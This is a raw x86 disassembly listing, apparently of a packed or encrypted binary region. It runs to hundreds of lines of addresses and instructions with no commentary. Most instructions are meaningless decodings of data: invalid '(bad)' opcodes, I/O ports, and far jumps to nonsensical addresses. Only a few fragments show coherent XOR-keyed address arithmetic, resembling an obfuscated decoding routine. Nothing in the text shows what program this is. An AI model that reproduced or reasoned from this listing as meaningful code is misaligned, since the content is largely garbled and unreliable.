  40c8a0:	xchg   DWORD PTR [ecx],ebp
  40c8a2:	das    
  40c8a3:	mov    ebp,0xf7dbd844
  40c8a8:	popf   
  40c8a9:	push   esi
  40c8aa:	(bad)  
  40c8ab:	xchg   DWORD PTR cs:[edx-0x2],edx
  40c8af:	loope  0x40c871
  40c8b1:	es pushf 
  40c8b3:	xchg   BYTE PTR [eax-0x64db8a83],cl
  40c8b9:	or     eax,0x2ca4b6b2
  40c8be:	or     BYTE PTR [ecx],bl
  40c8c0:	jle    0x40c8d1
  40c8c2:	(bad)  
  40c8c4:	inc    ebx
  40c8c5:	mov    ds:0x18984339,eax
  40c8ca:	inc    esp
  40c8cb:	cld    
  40c8cc:	push   esi
  40c8cd:	retf   0xdee8
  40c8d0:	cmp    eax,0xeadeac0f
  40c8d5:	out    dx,eax
  40c8d6:	imul   edx,DWORD PTR [esi-0x1544f46b],0xffffffbd
  40c8dd:	cmp    eax,0x11e95bcb
  40c8e2:	imul   ecx,DWORD PTR [edi+0x57c37164],0x7d
  40c8e9:	push   cs
  40c8ea:	pop    ebp
  40c8eb:	mov    ah,0xce
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	dec    ebp
  40c919:	mov    bl,0xe8
  40c91b:	ret    0x94ec
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c926
  40c925:	aad    0xd9
  40c927:	(bad)
  40c92a:	lahf   
  40c92b:	outs   dx,DWORD PTR ds:[esi]
  40c92c:	daa    
  40c92d:	sar    DWORD PTR [eax+0x15],cl
  40c930:	sbb    BYTE PTR [eax-0x48],bl
  40c933:	mov    edx,0x45dd3d4e
  40c938:	in     eax,dx
  40c939:	cdq    
  40c93a:	add    esi,DWORD PTR [ebx-0x4f7d0571]
  40c940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c941:	dec    ecx
  40c942:	push   es
  40c943:	dec    edx
  40c944:	in     eax,dx
  40c945:	outs   dx,DWORD PTR ds:[esi]
  40c946:	popa   
  40c947:	xchg   BYTE PTR [ecx-0x2d],bl
  40c94a:	(bad)  
  40c94b:	dec    esp
  40c94c:	fs shl al,cl
  40c94f:	mov    fs,esi
  40c951:	je     0x40c91f
  40c953:	xor    esi,eax
  40c955:	(bad)  
  40c956:	test   al,0x39
  40c958:	rcr    BYTE PTR [edi],cl
  40c95a:	dec    edi
  40c95b:	or     al,BYTE PTR [ebx]
  40c95d:	rol    BYTE PTR [ebp+0x3c],1
  40c960:	stc    
  40c961:	rcr    DWORD PTR [ebx],1
  40c963:	cmp    BYTE PTR [edi-0x65],al
  40c966:	icebp  
  40c967:	aam    0xd5
  40c969:	imul   ecx,DWORD PTR [ebx+0x27],0xffffff92
  40c96d:	aad    0x35
  40c96f:	jecxz  0x40c976
  40c971:	and    al,0x2
  40c973:	push   ebx
  40c974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c975:	out    0x51,eax
  40c977:	dec    esi
  40c978:	push   eax
  40c979:	jmp    0x40c9a5
  40c97b:	add    eax,0xd5e68758
  40c980:	cmp    ch,ah
  40c982:	pop    ebp
  40c983:	jb     0x40c90f
  40c985:	(bad)  
  40c986:	cmp    esi,DWORD PTR [edx]
  40c988:	call   0x9a56:0xdb7a61fd
  40c98f:	ret    0x7211
  40c992:	xor    BYTE PTR [edx+0x6e2c862d],cl
  40c998:	mov    eax,gs
  40c99a:	pusha  
  40c99b:	add    BYTE PTR [bp+di-0x3e2f],ch
  40c9a0:	into   
  40c9a1:	jno    0x40c9e4
  40c9a3:	jmp    0xedbf:0x4bbd8467
  40c9aa:	and    ecx,DWORD PTR ds:0xfc2b70d1
  40c9b0:	scas   eax,DWORD PTR es:[edi]
  40c9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9b2:	inc    eax
  40c9b3:	iret   
  40c9b4:	xchg   edx,eax
  40c9b5:	xchg   ebx,eax
  40c9b6:	pop    esp
  40c9b7:	jle    0x40ca32
  40c9b9:	js     0x40c94c
  40c9bb:	les    ebp,FWORD PTR ds:[esi-0x3d]
  40c9bf:	(bad)
  40c9c2:	mov    ch,0x17
  40c9c4:	mov    esp,0xaf55d769
  40c9c9:	sar    DWORD PTR [ebp-0x4bbb240a],1
  40c9cf:	ret    0x26e6
  40c9d2:	in     eax,dx
  40c9d3:	dec    edi
  40c9d4:	xor    dh,ah
  40c9d6:	xor    ah,0xec
  40c9d9:	mov    ch,0xfd
  40c9db:	and    eax,ebx
  40c9dd:	add    eax,0xe21edf5d
  40c9e2:	add    BYTE PTR [ebp+0x5d],ch
  40c9e5:	cld    
  40c9e6:	aad    0xd9
  40c9e8:	dec    esi
  40c9e9:	idiv   BYTE PTR [esi]
  40c9eb:	push   ds
  40c9ec:	ins    DWORD PTR es:[edi],dx
  40c9ed:	jmp    0xddfc2630
  40c9f2:	pop    ecx
  40c9f3:	cmp    al,0x29
  40c9f5:	ds cmp bl,al
  40c9f8:	push   ebp
  40c9f9:	imul   ebx,esi,0xfffffffd
  40c9fc:	fild   WORD PTR [edi+0x61]
  40c9ff:	out    dx,eax
  40ca00:	in     al,0xce
  40ca02:	retf   0x3e79
  40ca05:	cli    
  40ca06:	inc    eax
  40ca07:	mov    bh,0x6e
  40ca09:	cwde   
  40ca0a:	adc    esp,ecx
  40ca0c:	xchg   ebp,eax
  40ca0d:	lahf   
  40ca0e:	inc    edi
  40ca0f:	cmp    eax,0x14d28bfe
  40ca14:	(bad)  
  40ca15:	cld    
  40ca16:	mov    ds:0xe2946f02,al
  40ca1b:	mov    ch,0x73
  40ca1d:	sub    BYTE PTR [edi],0xac
  40ca20:	sbb    esp,0x664ad447
  40ca26:	mov    dl,0x29
  40ca28:	or     eax,0x817ef52d
  40ca2d:	ins    BYTE PTR es:[edi],dx
  40ca2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca2f:	pusha  
  40ca30:	fninit 
  40ca32:	inc    eax
  40ca33:	jno    0x40ca86
  40ca35:	repz call 0xcae11c9b
  40ca3b:	pop    eax
  40ca3c:	mov    eax,0xfc6f7275
  40ca41:	xor    eax,0x46d2f3d6
  40ca46:	jno    0x40ca3c
  40ca48:	sub    eax,DWORD PTR [ecx]
  40ca4a:	sub    ebx,DWORD PTR [eax-0x2f]
  40ca4d:	inc    edx
  40ca4e:	test   eax,0xcac3579f
  40ca53:	gs into 
  40ca55:	jmp    0x20a1:0x174d8a56
  40ca5c:	test   BYTE PTR [ebp-0x75],bh
  40ca5f:	and    ebx,DWORD PTR [edx-0x10]
  40ca62:	pop    esp
  40ca63:	mov    esp,0x2f6d6da7
  40ca68:	retf   0xcbb2
  40ca6b:	aad    0x9a
  40ca6d:	adc    ah,BYTE PTR [ecx]
  40ca6f:	aam    0x29
  40ca71:	fcmovb st,st(3)
  40ca73:	mov    eax,ds:0xfe57efb4
  40ca78:	iret   
  40ca79:	lahf   
  40ca7a:	or     al,0x84
  40ca7c:	mov    dl,0x26
  40ca7e:	push   eax
  40ca7f:	mov    ebp,0x3c49dda2
  40ca84:	mov    esi,0x8cd1bcaf
  40ca89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca8a:	sbb    BYTE PTR ds:0x4ba7d0c1,dh
  40ca90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca91:	jle    0x40ca22
  40ca93:	hlt    
  40ca94:	xchg   bl,bh
  40ca96:	and    BYTE PTR [esi],bh
  40ca98:	and    BYTE PTR [esi-0x63e42b9f],ch
  40ca9e:	ss (bad) 
  40caa1:	das    
  40caa2:	pop    ds
  40caa3:	jg     0x40cac0
  40caa5:	ror    dh,0xd7
  40caa8:	mov    ecx,0x8c522108
  40caad:	icebp  
  40caae:	xchg   edx,eax
  40caaf:	inc    ebx
  40cab0:	and    ebp,DWORD PTR [eax+0x2]
  40cab3:	aam    0xcf
  40cab5:	jg     0x40ca91
  40cab7:	pop    edx
  40cab8:	hlt    
  40cab9:	stos   BYTE PTR es:[edi],al
  40caba:	mov    dh,0xcc
  40cabc:	inc    bx
  40cabe:	out    dx,al
  40cabf:	cld    
  40cac0:	popa   
  40cac1:	daa    
  40cac2:	call   0x6409375f
  40cac7:	gs mov dh,0x1a
  40caca:	pop    ebx
  40cacb:	mov    bl,0x13
  40cacd:	(bad)  [ebx]
  40cacf:	dec    eax
  40cad0:	mov    edi,0xcbf682ac
  40cad5:	adc    al,0xf6
  40cad7:	ins    BYTE PTR es:[edi],dx
  40cad8:	mov    edi,0x204d5b28
  40cadd:	mov    eax,ds:0xb122d28e
  40cae2:	retf   
  40cae3:	mov    edi,0x22b420dc
  40cae8:	fcomp  DWORD PTR [ebx+0x6d17f5ce]
  40caee:	nop
  40caef:	cwde   
  40caf0:	mov    ebp,0x8f747f75
  40caf5:	xlat   BYTE PTR ds:[ebx]
  40caf6:	dec    ecx
  40caf7:	xor    al,0x86
  40caf9:	add    ebx,DWORD PTR [edx+0x78]
  40cafc:	mov    WORD PTR [eax],?
  40cafe:	int    0x5c
  40cb00:	add    ecx,DWORD PTR ds:0xfbb5a602
  40cb06:	or     ebp,DWORD PTR [eax]
  40cb08:	mov    eax,eax
  40cb0a:	pop    es
  40cb0b:	je     0x40cacc
  40cb0d:	fucomi st,st(0)
  40cb0f:	arpl   WORD PTR [esi-0x6a],ax
  40cb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb13:	pushf  
  40cb14:	scas   al,BYTE PTR es:[edi]
  40cb15:	std    
  40cb16:	test   BYTE PTR [esi+0x3064be80],ch
  40cb1c:	sbb    eax,DWORD PTR [esi+0x4e]
  40cb1f:	inc    ebp
  40cb20:	push   ebp
  40cb21:	mov    ebx,0x45174fdd
  40cb26:	jmp    0x3ba3:0xa482aa84
  40cb2d:	xchg   BYTE PTR [esi+edx*4+0x48],ah
  40cb31:	and    DWORD PTR [ebx],ecx
  40cb33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb34:	(bad)  
  40cb35:	push   eax
  40cb36:	dec    edi
  40cb37:	xor    dh,BYTE PTR [esi-0x67]
  40cb3a:	push   ebx
  40cb3b:	adc    al,0x17
  40cb3d:	pop    ebp
  40cb3e:	sub    al,0x62
  40cb40:	mov    bl,0x8f
  40cb42:	call   0xa206:0xa77c62ac
  40cb49:	pop    ds
  40cb4a:	mov    al,0x22
  40cb4c:	xchg   ecx,eax
  40cb4d:	mov    edx,esi
  40cb4f:	rcr    DWORD PTR [edx-0x59],0xfc
  40cb53:	iret   
  40cb54:	xchg   ebp,eax
  40cb55:	fnstsw WORD PTR [ebx+eax*8-0x7ef68306]
  40cb5c:	jno    0x40cba8
  40cb5e:	test   al,0x0
  40cb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb61:	pushf  
  40cb62:	ds jb  0x40cb57
  40cb65:	test   eax,0x693c2476
  40cb6a:	aaa    
  40cb6b:	sbb    cl,BYTE PTR ds:0xd88aa304
  40cb71:	xor    ebp,esi
  40cb73:	push   ds
  40cb74:	arpl   WORD PTR [ebx+0x6df141b4],dx
  40cb7a:	inc    esi
  40cb7b:	je     0x40cbdb
  40cb7d:	out    0x27,eax
  40cb7f:	jbe    0x40cbee
  40cb81:	sub    DWORD PTR [eax+ebx*4],edi
  40cb84:	jb     0x40cb06
  40cb86:	inc    ebp
  40cb87:	sub    edx,esi
  40cb89:	or     DWORD PTR [eax-0x4a],esp
  40cb8c:	(bad)  
  40cb8d:	retf   0x2d87
  40cb90:	mul    DWORD PTR [ebp+0x63]
  40cb93:	push   cs
  40cb94:	daa    
  40cb95:	adc    DWORD PTR [edx-0x31cc3054],ebx
  40cb9b:	xor    BYTE PTR [ebx-0x54],bh
  40cb9e:	fsub   st,st(7)
  40cba0:	jmp    0x96726489
  40cba5:	jge    0x40cb97
  40cba7:	cmp    esp,DWORD PTR [esi]
  40cba9:	pop    DWORD PTR [esi+0x6d]
  40cbac:	mov    ?,WORD PTR [ebx-0x56]
  40cbaf:	mov    bl,0x67
  40cbb1:	sahf   
  40cbb2:	lds    edi,FWORD PTR [eax+ebx*1+0x76]
  40cbb6:	hlt    
  40cbb7:	adc    al,0xab
  40cbb9:	and    DWORD PTR [edx+ebx*2-0x2788943a],ecx
  40cbc0:	add    DWORD PTR [edx],esp
  40cbc2:	iret   
  40cbc3:	jge    0x40cc00
  40cbc5:	(bad)  
  40cbc8:	and    ch,BYTE PTR [ebx-0x7f941e09]
  40cbce:	jle    0x40cb6c
  40cbd0:	sub    bl,cl
  40cbd2:	pop    edx
  40cbd3:	inc    ebx
  40cbd4:	xchg   esp,eax
  40cbd5:	cmp    edx,DWORD PTR [esi+0x1bfea1d1]
  40cbdb:	add    DWORD PTR [ecx+0x7c],ecx
  40cbde:	fist   DWORD PTR [eax-0x5c]
  40cbe1:	mov    ah,0xee
  40cbe3:	and    BYTE PTR [ebx],dl
  40cbe5:	and    BYTE PTR [ecx+0x6c855abc],dl
  40cbeb:	xchg   esi,eax
  40cbec:	cwde   
  40cbed:	retf   0x175
  40cbf0:	stos   BYTE PTR es:[edi],al
  40cbf1:	cmp    DWORD PTR [edx-0x774a290],esi
  40cbf7:	xchg   DWORD PTR [eax-0x344c23d3],esi
  40cbfd:	jns    0x40cbc9
  40cbff:	inc    esi
  40cc00:	jnp    0x40cc2b
  40cc02:	ins    BYTE PTR es:[edi],dx
  40cc03:	push   cs
  40cc04:	sar    DWORD PTR [edx+0x70178f65],1
  40cc0a:	pop    ecx
  40cc0b:	ficom  DWORD PTR [ebp+0x5e100b5b]
  40cc11:	scas   al,BYTE PTR es:[edi]
  40cc12:	bnd jmp 0xd9aea7c
  40cc18:	adc    esi,DWORD PTR [ecx+0x3f]
  40cc1b:	ret    0xa2f9
  40cc1e:	adc    esp,DWORD PTR [ebx-0x27]
  40cc21:	fs inc ebp
  40cc23:	and    al,0x80
  40cc25:	lock mov cl,0x22
  40cc28:	(bad)  
  40cc29:	adc    ch,BYTE PTR [ecx]
  40cc2b:	mov    edi,0xbbea8d1e
  40cc30:	in     al,0xe2
  40cc32:	dec    ebp
  40cc33:	imul   eax,DWORD PTR [ebp+eax*4-0x2f],0xfc802d3e
  40cc3b:	les    ebx,FWORD PTR [esi-0x5db1c29b]
  40cc41:	mov    ebx,0x91b65a0a
  40cc46:	aad    0xea
  40cc48:	fincstp 
  40cc4a:	rcl    DWORD PTR [edx+edi*8-0x57107e3a],cl
  40cc51:	out    dx,eax
  40cc52:	jno    0x40cc25
  40cc54:	fcmovnbe st,st(1)
  40cc56:	xchg   ecx,eax
  40cc57:	mov    ah,0xbb
  40cc59:	mov    BYTE PTR [edi-0x7a],0x2f
  40cc5d:	and    eax,0x78fea02
  40cc62:	sub    eax,0x70145f7
  40cc67:	mov    dh,0xbb
  40cc69:	add    al,0xb4
  40cc6b:	int3   
  40cc6c:	push   cs
  40cc6d:	sub    dl,bl
  40cc6f:	test   eax,0x7d458d01
  40cc74:	sbb    BYTE PTR [ecx],dl
  40cc76:	ret    
  40cc77:	fdiv   QWORD PTR [ebp-0xafa3807]
  40cc7d:	mov    esi,0x6624cfde
  40cc82:	xlat   BYTE PTR ds:[ebx]
  40cc83:	shr    BYTE PTR [ebp+0x715620a9],1
  40cc89:	pop    edi
  40cc8a:	and    BYTE PTR [edx+0x3b],dh
  40cc8d:	cmp    DWORD PTR [edx+ebx*4+0x44e9ec99],ebx
  40cc94:	pop    es
  40cc95:	and    DWORD PTR [ecx+0x4],0x6a
  40cc99:	les    edi,FWORD PTR [esi-0x1c54a60a]
  40cc9f:	mov    BYTE PTR [esi],dl
  40cca1:	scas   al,BYTE PTR es:[edi]
  40cca2:	and    BYTE PTR [edx],0x4d
  40cca5:	(bad)  
  40cca6:	jnp    0x40cc75
  40cca8:	jge    0x40cc3d
  40ccaa:	xchg   ebx,eax
  40ccab:	xchg   esp,eax
  40ccac:	xlat   BYTE PTR ds:[ebx]
  40ccad:	or     BYTE PTR [ebx],dl
  40ccaf:	jnp    0x40cc78
  40ccb1:	fneni(8087 only) 
  40ccb3:	pop    ecx
  40ccb4:	lods   eax,DWORD PTR ds:[esi]
  40ccb5:	and    DWORD PTR ds:0x6eb1d1c1,edx
  40ccbb:	jb     0x40cd0d
  40ccbd:	ror    BYTE PTR [eax],0x45
  40ccc0:	push   ds
  40ccc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccc2:	shr    ebp,cl
  40ccc4:	cmp    eax,0xd103f833
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sbb    DWORD PTR [ebx],0x6a
  40cd18:	fadd   DWORD PTR [ebx+ecx*1-0x608f8f70]
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd36
  40cd23:	test   eax,esp
  40cd25:	ret    0x9290
  40cd28:	loope  0x40cd8b
  40cd2a:	pop    edi
  40cd2b:	ins    DWORD PTR es:[edi],dx
  40cd2c:	scas   al,BYTE PTR es:[edi]
  40cd2d:	push   0xd5b575f2
  40cd32:	adc    eax,0x2745e9e6
  40cd37:	cmc    
  40cd38:	cmp    BYTE PTR [esi],cl
  40cd3a:	test   ebx,ecx
  40cd3c:	imul   ebx,DWORD PTR [edi+0x16038baa],0x9209969d
  40cd46:	or     ecx,esi
  40cd48:	xchg   BYTE PTR [edx-0x5599cd71],bl
  40cd4e:	out    dx,eax
  40cd4f:	(bad)  
  40cd51:	(bad)  
  40cd53:	dec    esi
  40cd54:	pop    esp
  40cd55:	push   cs
  40cd56:	sbb    bh,BYTE PTR [ebp-0xf]
  40cd59:	fcmovne st,st(0)
  40cd5b:	sub    DWORD PTR [ebp-0xbbff16b],ecx
  40cd61:	ret    0xefdd
  40cd64:	cld    
  40cd65:	adc    al,0x52
  40cd67:	sub    al,0xf
  40cd69:	ds jns 0x40cd47
  40cd6c:	aas    
  40cd6d:	sbb    bh,cl
  40cd6f:	adc    eax,0x4766e922
  40cd74:	jns    0x40cdcd
  40cd76:	pop    ecx
  40cd77:	sbb    eax,DWORD PTR [edi-0x23]
  40cd7a:	in     eax,0x8
  40cd7c:	cmc    
  40cd7d:	dec    esi
  40cd7e:	xchg   ecx,eax
  40cd7f:	retf   
  40cd80:	loopne 0x40cd73
  40cd82:	mov    cl,0x92
  40cd84:	jns    0x40cd3e
  40cd86:	fist   DWORD PTR [ebx-0x11]
  40cd89:	imul   ecx,DWORD PTR [edx],0xc1fff91d
  40cd8f:	xor    al,0x33
  40cd91:	out    dx,eax
  40cd92:	ret    0x56de
  40cd95:	lods   eax,DWORD PTR ds:[esi]
  40cd96:	jmp    0xc0378227
  40cd9b:	pop    es
  40cd9c:	cli    
  40cd9d:	dec    eax
  40cd9e:	xor    BYTE PTR [ebx-0x343981d6],bl
  40cda4:	or     eax,0xa49fd7bc
  40cda9:	mov    esp,0xb558ec31
  40cdae:	jmp    0x40cdb6
  40cdb0:	mov    WORD PTR [edi-0xa],fs
  40cdb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdb4:	cs pop edi
  40cdb6:	leavew 
  40cdb8:	pop    esi
  40cdb9:	mov    edi,0x24112c64
  40cdbe:	std    
  40cdbf:	sub    BYTE PTR [esi],dh
  40cdc1:	cmc    
  40cdc2:	aaa    
  40cdc3:	push   ecx
  40cdc4:	fldenv [ecx-0x78]
  40cdc7:	call   0x1cd9d8d3
  40cdcc:	mov    DWORD PTR [ebx-0x4a],ebp
  40cdcf:	and    al,0x56
  40cdd1:	jl     0x40cdf4
  40cdd3:	mov    eax,ds:0xc890da48
  40cdd8:	mov    dh,0x31
  40cdda:	arpl   WORD PTR [edi],sp
  40cddc:	sti    
  40cddd:	imul   ebp,DWORD PTR [esi],0x3489ab7a
  40cde3:	lahf   
  40cde4:	and    ebp,DWORD PTR [edi+esi*8]
  40cde7:	mov    dl,0xc
  40cde9:	adc    DWORD PTR [ebx+0x33],ebx
  40cdec:	sahf   
  40cded:	call   0x3c4b:0xe86f05d3
  40cdf4:	lods   al,BYTE PTR ds:[esi]
  40cdf5:	ds mov ebp,0x1e7bbfa9
  40cdfb:	mov    eax,cs:0x831c2773
  40ce01:	mov    al,ds:0x897b3f5
  40ce06:	push   edx
  40ce07:	dec    eax
  40ce08:	and    DWORD PTR [eax-0x2182ef99],eax
  40ce0e:	or     eax,0x34e3c930
  40ce13:	sbb    al,0xa9
  40ce15:	pop    ebx
  40ce16:	add    eax,DWORD PTR [ebp-0x19]
  40ce19:	fild   QWORD PTR [ebx+0x32]
  40ce1c:	repnz loop 0x40ce5a
  40ce1f:	sbb    al,0xa8
  40ce21:	push   0x33
  40ce23:	xchg   ebp,eax
  40ce24:	dec    ebx
  40ce25:	out    dx,al
  40ce26:	mov    ecx,0xba97eeb7
  40ce2b:	sbb    ebx,DWORD PTR [ecx]
  40ce2d:	add    DWORD PTR [esi],esp
  40ce2f:	enter  0x38d0,0x73
  40ce33:	inc    ebp
  40ce34:	mov    dl,bl
  40ce36:	in     eax,0x73
  40ce38:	xor    ebx,esp
  40ce3a:	inc    eax
  40ce3b:	jb     0x40ce4c
  40ce3d:	fwait
  40ce3e:	iret   
  40ce3f:	rcr    ecx,1
  40ce41:	idiv   DWORD PTR [edi+0x69b026d5]
  40ce47:	inc    DWORD PTR [edi+0x52c7aad]
  40ce4d:	mov    ecx,0x1c1ccd37
  40ce52:	adc    esp,DWORD PTR [eax-0x32]
  40ce55:	daa    
  40ce56:	out    0x2,eax
  40ce58:	cmp    DWORD PTR [ebx+0x1bee0c38],esp
  40ce5e:	bound  esp,QWORD PTR [eax+edi*1]
  40ce61:	xchg   ebp,eax
  40ce62:	pusha  
  40ce63:	pop    ebp
  40ce64:	mul    bh
  40ce66:	sub    eax,DWORD PTR [ebx]
  40ce68:	mov    dh,0x7
  40ce6a:	fisubr WORD PTR [ecx+edi*1-0x5edcc2bf]
  40ce71:	icebp  
  40ce72:	pop    ebx
  40ce73:	dec    ebp
  40ce74:	sti    
  40ce75:	stos   DWORD PTR es:[edi],eax
  40ce76:	in     al,0x91
  40ce78:	cld    
  40ce79:	ins    DWORD PTR es:[edi],dx
  40ce7a:	xchg   esi,eax
  40ce7b:	sub    BYTE PTR [edx],0x59
  40ce7e:	ret    
  40ce7f:	sub    eax,0xdef507b7
  40ce84:	xor    BYTE PTR [eax],bl
  40ce86:	pushf  
  40ce87:	jmp    0xc22a43a3
  40ce8c:	stos   DWORD PTR es:[edi],eax
  40ce8d:	jg     0x40ce27
  40ce8f:	mov    DWORD PTR ds:0x11635012,esi
  40ce95:	aas    
  40ce96:	xchg   ecx,eax
  40ce97:	(bad)  
  40ce98:	fisttp DWORD PTR [ebx]
  40ce9a:	mov    ebx,0x6b3f486c
  40ce9f:	mov    ecx,0xb60dc9f2
  40cea4:	sub    BYTE PTR [esi+0x2796b13],bl
  40ceaa:	jae    0x40cf0e
  40ceac:	lock xor dl,dh
  40ceaf:	sub    al,0x86
  40ceb1:	add    al,bl
  40ceb3:	data16 mov bl,0xf6
  40ceb6:	xor    ebp,DWORD PTR [esi-0x1ae3a85d]
  40cebc:	out    dx,al
  40cebd:	js     0x40ce67
  40cebf:	cmc    
  40cec0:	add    bh,ah
  40cec2:	adc    BYTE PTR [ecx+ebx*4],ch
  40cec5:	inc    ebp
  40cec6:	retf   
  40cec7:	enter  0x3016,0x4d
  40cecb:	dec    ecx
  40cecc:	imul   edx,edi,0x7b3c766b
  40ced2:	add    al,0x8f
  40ced4:	lds    esp,FWORD PTR [ebx+ecx*8]
  40ced7:	cdq    
  40ced8:	aam    0xf
  40ceda:	cs mov ds,ebx
  40cedd:	call   0xa24c1c9a
  40cee2:	mov    ch,0x80
  40cee4:	outs   dx,DWORD PTR ds:[esi]
  40cee5:	mov    ebx,0x36218bb2
  40ceea:	xchg   ebp,eax
  40ceeb:	mov    ebp,0x4707e701
  40cef0:	imul   edx,ebp,0xffffffbf
  40cef3:	outs   dx,DWORD PTR ds:[esi]
  40cef4:	push   edi
  40cef5:	cs mov ebx,0x10db83a2
  40cefb:	call   0x5567:0xb9131a82
  40cf02:	mov    esp,0xb1e92f79
  40cf07:	xchg   ecx,eax
  40cf08:	cld    
  40cf09:	mov    dl,0x2a
  40cf0b:	inc    edx
  40cf0c:	mov    al,0x27
  40cf0e:	mov    WORD PTR [edx],ds
  40cf10:	add    edx,esi
  40cf12:	mov    cs,WORD PTR [edi]
  40cf14:	mov    bl,0x47
  40cf16:	stos   DWORD PTR es:[edi],eax
  40cf17:	pop    esi
  40cf18:	enter  0xdb0d,0x14
  40cf1c:	test   DWORD PTR [ecx-0x42],esi
  40cf1f:	xor    dh,BYTE PTR [ebp+0x332bf9fe]
  40cf25:	lahf   
  40cf26:	cs (bad) 
  40cf28:	sar    DWORD PTR [edi],cl
  40cf2a:	lods   eax,DWORD PTR ds:[esi]
  40cf2b:	sbb    cl,bl
  40cf2d:	mov    dh,0x90
  40cf2f:	stos   BYTE PTR es:[edi],al
  40cf30:	xor    DWORD PTR [eax-0x3da1fa0a],ebp
  40cf36:	inc    esi
  40cf37:	push   ebp
  40cf38:	or     al,0x96
  40cf3a:	fcomp  st(2)
  40cf3c:	fld    QWORD PTR [esi+eax*1+0x218e6755]
  40cf43:	jb     0x40cecb
  40cf45:	popf   
  40cf46:	stc    
  40cf47:	scas   eax,DWORD PTR es:[edi]
  40cf48:	xchg   ecx,eax
  40cf49:	mov    al,0x39
  40cf4b:	dec    esi
  40cf4c:	mov    edx,ebp
  40cf4e:	out    dx,al
  40cf4f:	sbb    edi,ebx
  40cf51:	dec    eax
  40cf52:	pop    ebp
  40cf53:	popa   
  40cf54:	push   edx
  40cf55:	int    0x59
  40cf57:	inc    ecx
  40cf58:	test   BYTE PTR ds:0x1e664e9c,cl
  40cf5e:	retf   
  40cf5f:	sti    
  40cf60:	or     BYTE PTR [ecx-0x51b5432e],al
  40cf66:	js     0x40cfc6
  40cf68:	out    dx,eax
  40cf69:	xor    al,0x9b
  40cf6b:	stos   BYTE PTR es:[edi],al
  40cf6c:	fst    QWORD PTR [ecx-0x14]
  40cf6f:	sbb    BYTE PTR [eax+0x118f52cb],0x72
  40cf76:	out    0xb,al
  40cf78:	jp     0x40cf02
  40cf7a:	jo     0x40cf14
  40cf7c:	or     edi,DWORD PTR [esi+0x14846300]
  40cf82:	nop
  40cf83:	xlat   BYTE PTR ds:[ebx]
  40cf84:	rcr    DWORD PTR ds:0x71264389,cl
  40cf8a:	(bad)  
  40cf8c:	mov    ebx,0x68b97f1
  40cf91:	mov    ecx,0xedefd2ee
  40cf96:	fist   WORD PTR [esi+edx*2+0x6e2dab08]
  40cf9d:	fadd   st(0),st
  40cf9f:	jp     0x40cfa7
  40cfa1:	in     al,dx
  40cfa2:	mov    DWORD PTR [edx],0xe7af58e5
  40cfa8:	ins    DWORD PTR es:[edi],dx
  40cfa9:	fstp   QWORD PTR [ecx-0x3338dedc]
  40cfaf:	repz cli 
  40cfb1:	inc    ebx
  40cfb2:	sbb    eax,0xe801a69e
  40cfb7:	or     eax,0x555e96cd
  40cfbc:	ret    
  40cfbd:	mov    bh,0xa8
  40cfbf:	adc    eax,0x9e857196
  40cfc4:	jge    0x40d039
  40cfc6:	cmp    eax,edi
  40cfc8:	jne    0x40cfa1
  40cfca:	fs pop esp
  40cfcc:	push   ds
  40cfcd:	xchg   esi,eax
  40cfce:	popa   
  40cfcf:	cmp    ah,BYTE PTR [ebx-0x6f]
  40cfd2:	outs   dx,BYTE PTR ds:[esi]
  40cfd3:	sub    al,0x3f
  40cfd5:	rol    DWORD PTR [esi+esi*1],cl
  40cfd8:	test   DWORD PTR [eax-0x2e],ebp
  40cfdb:	mov    esi,0x57f6798c
  40cfe0:	pop    es
  40cfe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfe2:	or     dh,BYTE PTR [ebp-0x4c]
  40cfe5:	sqrtps xmm4,xmm1
  40cfe8:	shl    BYTE PTR [ebx],1
